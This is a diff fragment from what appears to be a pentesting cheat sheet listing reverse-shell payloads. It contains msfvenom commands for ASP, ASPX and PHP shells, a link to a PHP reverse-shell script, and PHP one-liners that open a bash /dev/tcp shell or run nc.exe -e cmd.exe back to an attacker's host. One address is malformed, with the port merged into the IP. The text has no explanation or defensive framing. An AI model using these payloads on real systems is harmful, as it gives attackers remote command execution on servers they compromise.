@@ -11,7 +11,11 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f asp > shell
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f aspx > shell.aspx
 
 PHP 
+ https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php (This is golden)
+ msfvenom -p php/reverse_php LHOST=192.168.49.110 LPORT=1234 -f raw > shell.php
+ Linux
 <?php $cmd = shell_exec('bash -i >& /dev/tcp/10.10.10.14444 0>&1'); echo $cmd;?> 
+ Window
 <?php $cmd = shell_exec('cmd /c \\10.10.10.1\test\nc.exe -e cmd.exe 10.10.10.1 4444'); echo $cmd;?> 
 
 ````
